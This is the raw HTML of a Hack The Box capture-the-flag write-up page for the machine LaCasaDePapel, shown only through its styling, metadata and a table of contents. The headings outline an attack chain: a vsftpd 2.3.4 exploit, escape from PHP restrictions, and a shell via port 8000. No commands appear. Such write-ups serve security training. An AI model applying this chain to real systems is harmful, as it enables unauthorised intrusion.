<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="generator" content="Hugo 0.99.1" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
<style>
button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}
*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}:before,:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}
input,button,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}
.sr-only{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0,0,0,0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}
[role="button"]{cursor: pointer;}
.container{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}@media (min-width: 768px){.container{width:750px}}@media (min-width: 992px){.container{width:970px}}@media (min-width: 1200px){.container{width:1170px}}.container-fluid{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}.row{margin-left:-15px;margin-right:-15px}
.col-xs-1, .col-sm-1, .col-md-1, .col-lg-1, .col-xs-2, .col-sm-2, .col-md-2, .col-lg-2, .col-xs-3, .col-sm-3, .col-md-3, .col-lg-3, .col-xs-4, .col-sm-4, .col-md-4, .col-lg-4, .col-xs-5, .col-sm-5, .col-md-5, .col-lg-5, .col-xs-6, .col-sm-6, .col-md-6, .col-lg-6, .col-xs-7, .col-sm-7, .col-md-7, .col-lg-7, .col-xs-8, .col-sm-8, .col-md-8, .col-lg-8, .col-xs-9, .col-sm-9, .col-md-9, .col-lg-9, .col-xs-10, .col-sm-10, .col-md-10, .col-lg-10, .col-xs-11, .col-sm-11, .col-md-11, .col-lg-11, .col-xs-12, .col-sm-12, .col-md-12, .col-lg-12 { position: relative; min-height: 1px; padding-left: 15px; padding-right: 15px; }
@media (min-width: 768px){.col-sm-1,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-10,.col-sm-11,.col-sm-12{float:left}.col-sm-12{width:100%}.col-sm-11{width:91.66666667%}.col-sm-10{width:83.33333333%}.col-sm-9{width:75%}.col-sm-8{width:66.66666667%}.col-sm-7{width:58.33333333%}.col-sm-6{width:50%}.col-sm-5{width:41.66666667%}.col-sm-4{width:33.33333333%}.col-sm-3{width:25%}.col-sm-2{width:16.66666667%}.col-sm-1{width:8.33333333%}.col-sm-pull-12{right:100%}.col-sm-pull-11{right:91.66666667%}.col-sm-pull-10{right:83.33333333%}.col-sm-pull-9{right:75%}.col-sm-pull-8{right:66.66666667%}.col-sm-pull-7{right:58.33333333%}.col-sm-pull-6{right:50%}.col-sm-pull-5{right:41.66666667%}.col-sm-pull-4{right:33.33333333%}.col-sm-pull-3{right:25%}.col-sm-pull-2{right:16.66666667%}.col-sm-pull-1{right:8.33333333%}.col-sm-pull-0{right:auto}.col-sm-push-12{left:100%}.col-sm-push-11{left:91.66666667%}.col-sm-push-10{left:83.33333333%}.col-sm-push-9{left:75%}.col-sm-push-8{left:66.66666667%}.col-sm-push-7{left:58.33333333%}.col-sm-push-6{left:50%}.col-sm-push-5{left:41.66666667%}.col-sm-push-4{left:33.33333333%}.col-sm-push-3{left:25%}.col-sm-push-2{left:16.66666667%}.col-sm-push-1{left:8.33333333%}.col-sm-push-0{left:auto}.col-sm-offset-12{margin-left:100%}.col-sm-offset-11{margin-left:91.66666667%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-0{margin-left:0}}@media (min-width: 992px){.col-md-1,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-10,.col-md-11,.col-md-12{float:left}.col-md-12{width:100%}.col-md-11{width:91.66666667%}.col-md-10{width:83.33333333%}.col-md-9{width:75%}.col-md-8{width:66.66666667%}.col-md-7{width:58.33333333%}.col-md-6{width:50%}.col-md-5{width:41.66666667%}.col-md-4{width:33.33333333%}.col-md-3{width:25%}.col-md-2{width:16.66666667%}.col-md-1{width:8.33333333%}.col-md-pull-12{right:100%}.col-md-pull-11{right:91.66666667%}.col-md-pull-10{right:83.33333333%}.col-md-pull-9{right:75%}.col-md-pull-8{right:66.66666667%}.col-md-pull-7{right:58.33333333%}.col-md-pull-6{right:50%}.col-md-pull-5{right:41.66666667%}.col-md-pull-4{right:33.33333333%}.col-md-pull-3{right:25%}.col-md-pull-2{right:16.66666667%}.col-md-pull-1{right:8.33333333%}.col-md-pull-0{right:auto}.col-md-push-12{left:100%}.col-md-push-11{left:91.66666667%}.col-md-push-10{left:83.33333333%}.col-md-push-9{left:75%}.col-md-push-8{left:66.66666667%}.col-md-push-7{left:58.33333333%}.col-md-push-6{left:50%}.col-md-push-5{left:41.66666667%}.col-md-push-4{left:33.33333333%}.col-md-push-3{left:25%}.col-md-push-2{left:16.66666667%}.col-md-push-1{left:8.33333333%}.col-md-push-0{left:auto}.col-md-offset-12{margin-left:100%}.col-md-offset-11{margin-left:91.66666667%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-9{margin-left:75%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-6{margin-left:50%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-3{margin-left:25%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-0{margin-left:0}}
label { display: inline-block; max-width: 100%; margin-bottom: 5px; font-weight: bold; }
.btn{display:inline-block;margin-bottom:0;font-weight:400;text-align:center;vertical-align:middle;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;background-image:none;border:1px solid transparent;white-space:nowrap;padding:6px 12px;font-size:16px;line-height:1.4;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.btn:focus,.btn:active:focus,.btn.active:focus,.btn.focus,.btn:active.focus,.btn.active.focus{outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}.btn:hover,.btn:focus,.btn.focus{color:#333;text-decoration:none}.btn:active,.btn.active{outline:0;background-image:none;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,0.125);box-shadow:inset 0 3px 5px rgba(0,0,0,0.125)}.btn.disabled,.btn[disabled],fieldset[disabled] .btn{cursor:not-allowed;opacity:.65;filter:alpha(opacity=65);-webkit-box-shadow:none;box-shadow:none}a.btn.disabled,fieldset[disabled] a.btn{pointer-events:none}.btn-default{color:#333;background-color:#fff;border-color:#ccc}.btn-default:focus,.btn-default.focus{color:#333;background-color:#e6e6e6;border-color:#8c8c8c}.btn-default:hover{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default:active,.btn-default.active,.open > .dropdown-toggle.btn-default{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default:active:hover,.btn-default.active:hover,.open > .dropdown-toggle.btn-default:hover,.btn-default:active:focus,.btn-default.active:focus,.open > .dropdown-toggle.btn-default:focus,.btn-default:active.focus,.btn-default.active.focus,.open > .dropdown-toggle.btn-default.focus{color:#333;background-color:#d4d4d4;border-color:#8c8c8c}.btn-default:active,.btn-default.active,.open > .dropdown-toggle.btn-default{background-image:none}.btn-default.disabled:hover,.btn-default[disabled]:hover,fieldset[disabled] .btn-default:hover,.btn-default.disabled:focus,.btn-default[disabled]:focus,fieldset[disabled] .btn-default:focus,.btn-default.disabled.focus,.btn-default[disabled].focus,fieldset[disabled] .btn-default.focus{background-color:#fff;border-color:#ccc}.btn-default .badge{color:#fff;background-color:#333}.btn-primary{color:#fff;background-color:#195eff;border-color:#004cff}.btn-primary:focus,.btn-primary.focus{color:#fff;background-color:#0045e5;border-color:#00267f}.btn-primary:hover{color:#fff;background-color:#0045e5;border-color:#003ac1}.btn-primary:active,.btn-primary.active,.open > .dropdown-toggle.btn-primary{color:#fff;background-color:#0045e5;border-color:#003ac1}.btn-primary:active:hover,.btn-primary.active:hover,.open > .dropdown-toggle.btn-primary:hover,.btn-primary:active:focus,.btn-primary.active:focus,.open > .dropdown-toggle.btn-primary:focus,.btn-primary:active.focus,.btn-primary.active.focus,.open > .dropdown-toggle.btn-primary.focus{color:#fff;background-color:#003ac1;border-color:#00267f}.btn-primary:active,.btn-primary.active,.open > .dropdown-toggle.btn-primary{background-image:none}.btn-primary.disabled:hover,.btn-primary[disabled]:hover,fieldset[disabled] .btn-primary:hover,.btn-primary.disabled:focus,.btn-primary[disabled]:focus,fieldset[disabled] .btn-primary:focus,.btn-primary.disabled.focus,.btn-primary[disabled].focus,fieldset[disabled] .btn-primary.focus{background-color:#195eff;border-color:#004cff}.btn-primary .badge{color:#195eff;background-color:#fff}.btn-success{color:#fff;background-color:#00bc16;border-color:#00a313}.btn-success:focus,.btn-success.focus{color:#fff;background-color:#008910;border-color:#002304}.btn-success:hover{color:#fff;background-color:#008910;border-color:#00650c}.btn-success:active,.btn-success.active,.open > .dropdown-toggle.btn-success{color:#fff;background-color:#008910;border-color:#00650c}.btn-success:active:hover,.btn-success.active:hover,.open > .dropdown-toggle.btn-success:hover,.btn-success:active:focus,.btn-success.active:focus,.open > .dropdown-toggle.btn-success:focus,.btn-success:active.focus,.btn-success.active.focus,.open > .dropdown-toggle.btn-success.focus{color:#fff;background-color:#00650c;border-color:#002304}.btn-success:active,.btn-success.active,.open > .dropdown-toggle.btn-success{background-image:none}.btn-success.disabled:hover,.btn-success[disabled]:hover,fieldset[disabled] .btn-success:hover,.btn-success.disabled:focus,.btn-success[disabled]:focus,fieldset[disabled] .btn-success:focus,.btn-success.disabled.focus,.btn-success[disabled].focus,fieldset[disabled] .btn-success.focus{background-color:#00bc16;border-color:#00a313}.btn-success .badge{color:#00bc16;background-color:#fff}.btn-info{color:#fff;background-color:#5bc0de;border-color:#46b8da}.btn-info:focus,.btn-info.focus{color:#fff;background-color:#31b0d5;border-color:#1b6d85}.btn-info:hover{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info:active,.btn-info.active,.open > .dropdown-toggle.btn-info{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info:active:hover,.btn-info.active:hover,.open > .dropdown-toggle.btn-info:hover,.btn-info:active:focus,.btn-info.active:focus,.open > .dropdown-toggle.btn-info:focus,.btn-info:active.focus,.btn-info.active.focus,.open > .dropdown-toggle.btn-info.focus{color:#fff;background-color:#269abc;border-color:#1b6d85}.btn-info:active,.btn-info.active,.open > .dropdown-toggle.btn-info{background-image:none}.btn-info.disabled:hover,.btn-info[disabled]:hover,fieldset[disabled] .btn-info:hover,.btn-info.disabled:focus,.btn-info[disabled]:focus,fieldset[disabled] .btn-info:focus,.btn-info.disabled.focus,.btn-info[disabled].focus,fieldset[disabled] .btn-info.focus{background-color:#5bc0de;border-color:#46b8da}.btn-info .badge{color:#5bc0de;background-color:#fff}.btn-warning{color:#fff;background-color:#f0ad4e;border-color:#eea236}.btn-warning:focus,.btn-warning.focus{color:#fff;background-color:#ec971f;border-color:#985f0d}.btn-warning:hover{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning:active,.btn-warning.active,.open > .dropdown-toggle.btn-warning{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning:active:hover,.btn-warning.active:hover,.open > .dropdown-toggle.btn-warning:hover,.btn-warning:active:focus,.btn-warning.active:focus,.open > .dropdown-toggle.btn-warning:focus,.btn-warning:active.focus,.btn-warning.active.focus,.open > .dropdown-toggle.btn-warning.focus{color:#fff;background-color:#d58512;border-color:#985f0d}.btn-warning:active,.btn-warning.active,.open > .dropdown-toggle.btn-warning{background-image:none}.btn-warning.disabled:hover,.btn-warning[disabled]:hover,fieldset[disabled] .btn-warning:hover,.btn-warning.disabled:focus,.btn-warning[disabled]:focus,fieldset[disabled] .btn-warning:focus,.btn-warning.disabled.focus,.btn-warning[disabled].focus,fieldset[disabled] .btn-warning.focus{background-color:#f0ad4e;border-color:#eea236}.btn-warning .badge{color:#f0ad4e;background-color:#fff}.btn-danger{color:#fff;background-color:#d9534f;border-color:#d43f3a}.btn-danger:focus,.btn-danger.focus{color:#fff;background-color:#c9302c;border-color:#761c19}.btn-danger:hover{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger:active,.btn-danger.active,.open > .dropdown-toggle.btn-danger{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger:active:hover,.btn-danger.active:hover,.open > .dropdown-toggle.btn-danger:hover,.btn-danger:active:focus,.btn-danger.active:focus,.open > .dropdown-toggle.btn-danger:focus,.btn-danger:active.focus,.btn-danger.active.focus,.open > .dropdown-toggle.btn-danger.focus{color:#fff;background-color:#ac2925;border-color:#761c19}.btn-danger:active,.btn-danger.active,.open > .dropdown-toggle.btn-danger{background-image:none}.btn-danger.disabled:hover,.btn-danger[disabled]:hover,fieldset[disabled] .btn-danger:hover,.btn-danger.disabled:focus,.btn-danger[disabled]:focus,fieldset[disabled] .btn-danger:focus,.btn-danger.disabled.focus,.btn-danger[disabled].focus,fieldset[disabled] .btn-danger.focus{background-color:#d9534f;border-color:#d43f3a}.btn-danger .badge{color:#d9534f;background-color:#fff}.btn-link{color:#000;font-weight:400;border-radius:0}.btn-link,.btn-link:active,.btn-link.active,.btn-link[disabled],fieldset[disabled] .btn-link{background-color:transparent;-webkit-box-shadow:none;box-shadow:none}.btn-link,.btn-link:hover,.btn-link:focus,.btn-link:active{border-color:transparent}.btn-link:hover,.btn-link:focus{color:#000;text-decoration:none;background-color:transparent}.btn-link[disabled]:hover,fieldset[disabled] .btn-link:hover,.btn-link[disabled]:focus,fieldset[disabled] .btn-link:focus{color:#777;text-decoration:none}.btn-lg{padding:10px 16px;font-size:20px;line-height:1.3333333;border-radius:6px}.btn-sm{padding:5px 10px;font-size:14px;line-height:1.5;border-radius:3px}.btn-xs{padding:1px 5px;font-size:14px;line-height:1.5;border-radius:3px}.btn-block{display:block;width:100%}.btn-block + .btn-block{margin-top:5px}
.dropup,.dropdown{position:relative}.dropdown-toggle:focus{outline:0}.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:160px;padding:5px 0;margin:2px 0 0;list-style:none;font-size:16px;text-align:left;background-color:#fff;border:1px solid #ccc;border:1px solid rgba(0,0,0,0.15);border-radius:4px;-webkit-box-shadow:0 6px 12px rgba(0,0,0,0.175);box-shadow:0 6px 12px rgba(0,0,0,0.175);-webkit-background-clip:padding-box;background-clip:padding-box}.dropdown-menu.pull-right{right:0;left:auto}.dropdown-menu .divider{height:1px;margin:10px 0;overflow:hidden;background-color:#e5e5e5}.dropdown-menu > li > a{display:block;padding:3px 10px;clear:both;font-weight:400;line-height:1.4;color:#333;white-space:nowrap}.dropdown-menu > li > a:hover,.dropdown-menu > li > a:focus{text-decoration:none;color:#262626;background-color:#f5f5f5}.dropdown-menu > .active > a,.dropdown-menu > .active > a:hover,.dropdown-menu > .active > a:focus{color:#fff;text-decoration:none;outline:0;background-color:#195eff}.dropdown-menu > .disabled > a,.dropdown-menu > .disabled > a:hover,.dropdown-menu > .disabled > a:focus{color:#777}.dropdown-menu > .disabled > a:hover,.dropdown-menu > .disabled > a:focus{text-decoration:none;background-color:transparent;background-image:none;filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);cursor:not-allowed}.open > .dropdown-menu{display:block}.open > a{outline:0}.dropdown-menu-right{left:auto;right:0}.dropdown-menu-left{left:0;right:auto}.dropdown-header{display:block;padding:3px 10px;font-size:14px;line-height:1.4;color:#777;white-space:nowrap}.dropdown-backdrop{position:fixed;left:0;right:0;bottom:0;top:0;z-index:990}.pull-right > .dropdown-menu{right:0;left:auto}.dropup .caret,.navbar-fixed-bottom .dropdown .caret{border-top:0;border-bottom:4px dashed;border-bottom:4px solid \9;content:""}.dropup .dropdown-menu,.navbar-fixed-bottom .dropdown .dropdown-menu{top:auto;bottom:100%;margin-bottom:2px}
.nav{margin-bottom:0;padding-left:0;list-style:none}.nav > li{position:relative;display:block}.nav > li > a{position:relative;display:block;padding:5px 10px}.nav > li > a:hover,.nav > li > a:focus{text-decoration:none;background-color:#a52a2a}.nav > li.disabled > a{color:#777}.nav > li.disabled > a:hover,.nav > li.disabled > a:focus{color:#777;text-decoration:none;background-color:transparent;cursor:not-allowed}.nav .open > a,.nav .open > a:hover,.nav .open > a:focus{background-color:#a52a2a;border-color:#000}.nav .nav-divider{height:1px;margin:10px 0;overflow:hidden;background-color:#e5e5e5}.nav > li > a > img{max-width:none}.nav-pills > li{float:left}.nav-pills > li > a{border-radius:4px}.nav-pills > li + li{margin-left:2px}.nav-pills > li.active > a,.nav-pills > li.active > a:hover,.nav-pills > li.active > a:focus{color:#fff;background-color:#195eff}.nav-stacked > li{float:none}.nav-stacked > li + li{margin-top:0px;margin-left:0}.navbar{position:relative;min-height:48px;max-height:48px;margin-bottom:22px;border:1px solid transparent}@media (min-width: 768px){.navbar{border-radius:4px}}@media (max-device-width: 480px) and (orientation: landscape){.navbar-fixed-top .navbar-collapse,.navbar-fixed-bottom .navbar-collapse{max-height:200px}}.navbar-static-top{z-index:1000;border-width:0 0 1px}@media (min-width: 768px){.navbar-static-top{border-radius:0}}.navbar-fixed-top,.navbar-fixed-bottom{position:fixed;right:0;left:0;z-index:1030}@media (min-width: 768px){.navbar-fixed-top,.navbar-fixed-bottom{border-radius:0}}.navbar-fixed-top{top:0;border-width:0 0 1px}.navbar-fixed-bottom{bottom:0;margin-bottom:0;border-width:1px 0 0}@media (min-width: 768px){.navbar > .container .navbar-brand,.navbar > .container-fluid .navbar-brand{margin-left:-15px}}.navbar-fixed-bottom .navbar-nav > li > .dropdown-menu{margin-bottom:0;border-top-right-radius:4px;border-top-left-radius:4px;border-bottom-right-radius:0;border-bottom-left-radius:0}.navbar-default{background-color:#7d1935;border-color:#611329}.navbar-default .navbar-nav > li > a{color:#fff}.navbar-default .navbar-nav > li > a:hover,.navbar-default .navbar-nav > li > a:focus{color:#fff;background-color:#a52a2a}.navbar-default .navbar-nav > .active > a,.navbar-default .navbar-nav > .active > a:hover,.navbar-default .navbar-nav > .active > a:focus{color:#fff;background-color:#611329}.navbar-default .navbar-nav > .disabled > a,.navbar-default .navbar-nav > .disabled > a:hover,.navbar-default .navbar-nav > .disabled > a:focus{color:#ccc;background-color:transparent}.navbar-default .navbar-toggle{border-color:#a52a2a}.navbar-default .navbar-toggle:hover,.navbar-default .navbar-toggle:focus{background-color:#a52a2a}.navbar-default .navbar-toggle .icon-bar{background-color:#888}.navbar-default .navbar-collapse,.navbar-default .navbar-form{border-color:#611329}.navbar-default .navbar-nav > .open > a,.navbar-default .navbar-nav > .open > a:hover,.navbar-default .navbar-nav > .open > a:focus{background-color:#611329;color:#fff}@media (max-width: 767px){.navbar-default .navbar-nav .open .dropdown-menu > li > a{color:#fff}.navbar-default .navbar-nav .open .dropdown-menu > li > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > li > a:focus{color:#fff;background-color:#a52a2a}.navbar-default .navbar-nav .open .dropdown-menu > .active > a,.navbar-default .navbar-nav .open .dropdown-menu > .active > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > .active > a:focus{color:#fff;background-color:#611329}.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a,.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:focus{color:#ccc;background-color:transparent}}.navbar-default .navbar-link{color:#fff}.navbar-default .navbar-link:hover{color:#fff}.navbar-default .btn-link{color:#fff}.navbar-default .btn-link:hover,.navbar-default .btn-link:focus{color:#fff}
.label{display:inline;padding:.2em .6em .3em;font-size:75%;font-weight:700;line-height:1;color:#fff;text-align:center;white-space:nowrap;vertical-align:baseline;border-radius:.25em}a.label:hover,a.label:focus{color:#fff;text-decoration:none;cursor:pointer}.label:empty{display:none}.btn .label{position:relative;top:-1px}.label-default{background-color:#777}.label-default[href]:hover,.label-default[href]:focus{background-color:#5e5e5e}.label-primary{background-color:#195eff}.label-primary[href]:hover,.label-primary[href]:focus{background-color:#0045e5}.label-success{background-color:#00bc16}.label-success[href]:hover,.label-success[href]:focus{background-color:#008910}.label-info{background-color:#5bc0de}.label-info[href]:hover,.label-info[href]:focus{background-color:#31b0d5}.label-warning{background-color:#f0ad4e}.label-warning[href]:hover,.label-warning[href]:focus{background-color:#ec971f}.label-danger{background-color:#d9534f}.label-danger[href]:hover,.label-danger[href]:focus{background-color:#c9302c}.badge{display:inline-block;min-width:10px;padding:3px 7px;font-size:14px;font-weight:700;color:#fff;line-height:1;vertical-align:middle;white-space:nowrap;text-align:center;background-color:#000;border-radius:10px}.badge:empty{display:none}.btn .badge{position:relative;top:-1px}.btn-xs .badge,.btn-group-xs > .btn .badge{top:0;padding:1px 5px}a.badge:hover,a.badge:focus{color:#fff;text-decoration:none;cursor:pointer}
.nav-pills > .active > a > .badge{color:#000;background-color:#fff}.nav-pills > li > a > .badge{margin-left:3px}
.clearfix:before,.clearfix:after,.container:before,.container:after,.container-fluid:before,.container-fluid:after,.row:before,.row:after,.form-horizontal .form-group:before,.form-horizontal .form-group:after,.nav:before,.nav:after,.navbar:before,.navbar:after,.navbar-header:before,.navbar-header:after,.navbar-collapse:before,.navbar-collapse:after{content:" ";display:table}.clearfix:after,.container:after,.container-fluid:after,.row:after,.form-horizontal .form-group:after,.nav:after,.navbar:after,.navbar-header:after,.navbar-collapse:after{clear:both}
.pull-right { float: right !important; } .pull-left { float: left !important; }

 
html { font-size:16px; }
body:not(.en) :lang(en), body:not(.el) :lang(el), body:not(.fr) :lang(fr) { display: none; }
body {
  font-size: 16px; line-height: 1.45; color: #000000;  background-color: #eceff1;
  margin: 0; padding-top: 70px; 
  font-family: 'Open Sans', 'Times New Roman', sans-serif;
  -webkit-animation: bugfix infinite 1s;
}
@-webkit-keyframes bugfix { from { fill: 0; } to { fill: 0; } }

a { color: #000; word-wrap: break-word; text-decoration: none; }
a:hover, a:focus, a:active { color: black; text-decoration: none; }
a.label { box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
figure {  display: table; margin: 10px auto; }
figure figcaption { caption-side: bottom; color: darkblue; display: table-caption;
font-size: 14px; margin-top: 5px; text-align:justify; }
h1, h2, h3, h4, h5, h6 { margin:0px; text-align: justify; }
img { max-width: 100%; }
img.bordered { border:1px solid #021a40;  border-radius:20px; box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
li { line-height: 1.5rem; text-align:justify; }
p { text-align:justify; text-indent: 30px; }
section { margin-top: 1rem; margin-bottom: 1rem; }
section>header { margin-bottom: .3rem; }
ul, ol { padding-left: 1.5rem; }

article .image { background-size: cover; background-position: center; }
article time { font-size: .8rem; }
article.grid { max-width:384px; margin-bottom:0.5rem; height:26rem; overflow: hidden; }
article.grid .image { min-height: 12rem; }
article.grid footer { padding: 1rem; background-color: #ffffe6; }
article.grid .title { overflow: hidden; }
article.grid .summary { color: #333; font-size: .8rem; line-height: 1rem; max-height: 5rem; overflow: hidden; }
article.single { background-color: #fff; margin: 0 auto; padding-bottom: 1rem; max-width:1200px; }
article.single .image { max-width:786px; min-height: 24rem; margin-left:auto; margin-right:auto; }
article.single .body { margin-bottom: 2rem;  padding: 0 5rem; }
article.single .body a:not(.label) { color: #78909c; text-decoration: underline; }
article.single .body>h1, article.single .body>h2, article.single .body>h3 { padding-top: 60px; margin-top: -30px; margin-bottom: 0.5rem; }
article.single .body li {  margin: 0.5rem auto; }
article.li { margin-bottom: .5rem; font-size: .8rem; line-height: 1rem; }
article.li .cell { display:table-cell; vertical-align: middle; }
article.li .image { width: 4.1rem; height: 4.1rem; box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
article.li footer { display:table-cell; vertical-align: middle; padding-left: .5rem;  }
article.li time { font-size: .7rem; }
article.li .title { font-size: 0.85rem; line-height: 1rem; font-weight: 700; }

.body .title { font-size: 2rem; line-height: 3rem; margin: 0.5rem auto; }
.label { display:inline-block; padding-top: 0.25rem; }

.navbar * { color: white !important; }
.navbar .dropdown-menu a:hover { background-color: brown; }
.nav>li>a:hover, .nav>li>a:focus { color: white; background-color: brown; }
.nav-pills { display: inline-block; margin: 0; }
.nav-pills>li.active>a { font-weight: 700 !important; background-color: #00bc16 !important; }
.nav-pills>li.active>a .badge { color: #00bc16; }
.cssdropdown { margin-top: 2rem; }
.cssdropdown input[type=checkbox], .cssdropdown ul { display: none; }
.cssdropdown label { font-size: 1.25rem; font-weight:700; min-width: 300px; }
.cssdropdown input[type=checkbox]:checked ~ ul { display: table-cell; }

.p-logo {
  font-family: 'Comic Sans MS', cursive; font-weight: bold; font-size: 2rem;
  text-shadow: 4px 2px 2px rgba(0,0,0,0.75);
  margin-top: 3px;
}
.l-footer * { color: white; }
.l-footer { background-color: #7D1935; padding: 0.75rem 0; text-align: center; }

.lgfont { font-size: 2rem; }
.margin-sm { margin: 0.5rem; }
.side-margins-1 { margin-left: 1rem !important; margin-right: 1rem !important; }
.side-margins-2 { margin-left: 2rem !important;; margin-right: 2rem !important; }
.margin-top-sm {  margin-top: 0.5rem; }
.topmargin5 {  margin-top: 5px; }
.topmargin7 { margin-top: 7px; }

#search-section, #results-section { display:none; }
#TableOfContents ul { list-style: none; }
#TableOfContents>ul {  padding-left: 0; font-weight: 700; }
#TableOfContents>ul ul { font-weight: normal; }

.summary { text-align:justify; }
.max-width640 { max-width: 640px; }
.floatleft { float:left; margin-right: 10px; }
.floatright { float:right; margin-left: 10px; }

.centered { margin-left: auto !important;  margin-right: auto !important; }
img.centered { display:block !important; }
div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.centered, h2.centered, h3.centered { text-align:center !important; }

@media (max-width: 768px) {
  h1 { font-size: 1.4rem; line-height: 1.5rem; }
  h2 { font-size: 1.2rem; line-height: 1.5rem; }
  article.single .image { min-height: 12rem; }
  article.single .body pre { margin: 1rem -1rem; }
  article.single .body pre code { padding: 1rem 1rem; }
  article.single .body { padding: 0 1rem; }
  ul.scroll-menu { max-height: 250px; }
  .cssdropdown label, .nav-stacked>li>a { min-width: 240px; }
  .hidden768 { display:none; }
  .text-smaller {
    font-family: 'Open Sans', 'Times New Roman', sans-serif;
    font-size: 1rem;  font-weight: 700; letter-spacing: -1px;
    padding-left: 0px !important;  padding-right: 0px !important;
    line-height:32px;
  }
}
</style>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://alamot.github.io/index.xml">

  <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />


  <title>LaCasaDePapel (Hack The Box) write-up - The Portal of Knowledge</title>
  <meta property='og:title' content="LaCasaDePapel (Hack The Box) write-up - The Portal of Knowledge">
  <meta property="og:type" content="article">
  <meta name="description" content="Write-up for the LaCasaDePapel machine. Ανάλυση του μηχανήματος LaCasaDePapel (διαθέσιμη μόνο στα αγγλικά).">
  <meta property="og:description" content="Write-up for the LaCasaDePapel machine. Ανάλυση του μηχανήματος LaCasaDePapel (διαθέσιμη μόνο στα αγγλικά).">
  <meta property="og:image" content="https://alamot.github.io/images/ace.jpg">
  <meta property="og:image:width" content="768" />
  <meta property="og:image:height" content="384" />

<meta property="og:url" content="https://alamot.github.io/lacasadepapel_writeup/">


<script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "mainEntityOfPage":{
      "@type":"WebPage",
      "@id":"https:\/\/alamot.github.io\/"
    },
    "headline": "LaCasaDePapel (Hack The Box) write-up |  ",
    "image": {
      "@type": "ImageObject",
      "url": "",
      "height": 700,
      "width": 700
    },
    "datePublished": "2019-07-27T00:00:00JST",
    "dateModified": "2019-07-27T00:00:00JST",
    "author": {
      "@type": "Person",
      "name": "Antonios Tsolis",
      "image": "https:\/\/alamot.github.io\/images/logo.png"
    },
    "publisher": {
      "@type": "Organization",
      "name": "",
      "logo": {
        "@type": "ImageObject",
        "url": "https:\/\/alamot.github.io\/images/logo.png",
        "height": 60,
        "width": 60
      }
    },
    "description": ""
  }
</script>
</head>
<body id="mainbody" class="en" lang="en">
<nav class="navbar navbar-default navbar-fixed-top centered">
<div class="container-fluid">
  
   <ul class="nav nav-pills pull-left topmargin7">
    <li id="content-selector" role="presentation" class="dropdown">
    <a class="dropdown-toggle btn-danger" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false"><span lang="en">Contents</span><span lang="el">Περιεχόμενα</span> <i class="fa fa-caret-down" aria-hidden="true"></i></a>
      <ul class="dropdown-menu scroll-menu">
        <li><a href="#title"><span lang="en">Start</span><span lang="el">Αρχή</span></a></li>
        
        
        
         
<li><a href="#introduction">Introduction</a></li>
<li><a href="#enumeration">Enumeration</a>
<ul>
<li><a href="#port-scanning">Port scanning</a></li>
</ul></li>
<li><a href="#exploiting-vsftpd-2-3-4">Exploiting vsftpd 2.3.4</a></li>
<li><a href="#getting-dali-shell-by-escaping-php-restrictions">Getting dali shell by escaping PHP restrictions</a></li>
<li><a href="#getting-professor-shell-by-exploiting-port-8000">Getting professor shell by exploiting port 8000</a></li>
